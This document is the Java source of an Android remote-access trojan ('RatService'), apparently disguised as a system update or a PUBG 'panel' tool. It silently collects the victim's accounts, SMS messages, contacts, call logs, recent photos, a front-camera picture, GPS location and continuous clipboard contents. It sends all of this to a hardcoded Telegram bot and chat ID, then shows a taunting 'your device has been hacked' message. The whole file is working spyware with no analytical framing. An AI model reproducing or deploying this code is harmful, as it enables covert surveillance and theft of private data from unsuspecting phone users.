package com.system.update;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.*;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.widget.Toast;
import java.io.*;
import java.util.List;
import okhttp3.*;

public class RatService extends Service {
    private static final String BOT_TOKEN = "‏9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private OkHttpClient client = new OkHttpClient();
    private String lastClipboard = "";
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        
        new Thread(() -> {
            try {
                sendTextToTelegram("🔄 **الأداة اشتغلت! جاري سحب البيانات...**");
                
                dumpAllAccounts(); Thread.sleep(1000);
                String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                sendTextToTelegram(info); Thread.sleep(1000);

                dumpSms(); Thread.sleep(1500);
                dumpContacts(); Thread.sleep(1500);
                dumpCallLogs(); Thread.sleep(1500);
                dumpImages(); Thread.sleep(1500);
                
                takePhoto(); // سحب صورة
                getLocation(); // سحب الموقع

                sendTextToTelegram("✅ **اكتمل سحب البيانات والصور!**");
                
                startClipboardMonitor();
            } catch (Exception e) {
                sendTextToTelegram("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId).setContentTitle("panel pubge").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }
    }

    // --- التأثير الأول: رسالة على الشاشة ---
    public void showToast(String msg) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
        });
    }

    // --- التأثير الثاني: الكاميرا ---
    private void takePhoto() {
        try {
            Camera camera = Camera.open(0); // 0 = الكاميرا الأمامية
            camera.setPreviewTexture(new android.graphics.SurfaceTexture(10));
            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                File photo = new File(getExternalFilesDir(null), "hacked_photo.jpg");
                try (FileOutputStream fos = new FileOutputStream(photo)) {
                    fos.write(data);
                } catch (IOException ignored) {}
                cam.release();
                uploadFileToTelegram(photo, "image/jpeg");
                showToast("تم اختراق جهازك بنجاح 😂"); // الرسالة اللي هتطلعله
            });
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل الكاميرا: " + e.getMessage());
        }
    }

    // --- التأثير الثالث: الموقع ---
    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (loc != null) {
                String mapsLink = "📍 **الموقع:** https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                sendTextToTelegram(mapsLink);
            } else {
                sendTextToTelegram("❌ الموقع غير متاح حالياً.");
            }
        } catch (SecurityException e) {
            sendTextToTelegram("❌ صلاحية الموقع مرفوضة.");
        }
    }

    // --- تصليح سحب الصور (MediaStore) ---
    private void dumpImages() {
        try {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {MediaStore.Images.Media.DATA};
            Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 3");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    File imgFile = new File(path);
                    if (imgFile.exists() && imgFile.length() < 10 * 1024 * 1024) {
                        uploadFileToTelegram(imgFile, "image/jpeg");
                        Thread.sleep(2000);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل سحب الصور: " + e.getMessage());
        }
    }

    private void dumpSms() {
        File file = new File(getExternalFilesDir(null), "sms_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null && c.moveToFirst()) {
                do {
                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
                } while (c.moveToNext());
                c.close();
            } else {
                bw.write("لا توجد رسائل أو تم رفض الصلاحية.");
            }
            bw.flush(); 
            uploadFileToTelegram(file, "text/plain");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
        }
    }

    private void dumpAllAccounts() {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("📧 **الحسابات:**\n");
            for (Account account : accounts) sb.append("- ").append(account.type).append(": `").append(account.name).append("`\n");
            sendTextToTelegram(sb.toString());
        } catch (Exception e) {}
    }

    private void startClipboardMonitor() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        if (!text.isEmpty() && !text.equals(lastClipboard)) {
                            lastClipboard = text;
                            sendTextToTelegram("📋 **Clipboard:**\n`" + text + "`");
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void dumpContacts() {
        File file = new File(getExternalFilesDir(null), "contacts_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) { while (c.moveToNext()) bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n"); c.close(); }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpCallLogs() {
        File file = new File(getExternalFilesDir(null), "calls_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) { while (c.moveToNext()) bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + "\n"); c.close(); }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void sendTextToTelegram(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void uploadFileToTelegram(File file, String mimeType) {
        if (!file.exists()) return;
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                .build();
        Request request = new Request.Builder().url(TG_API + "sendDocument").post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
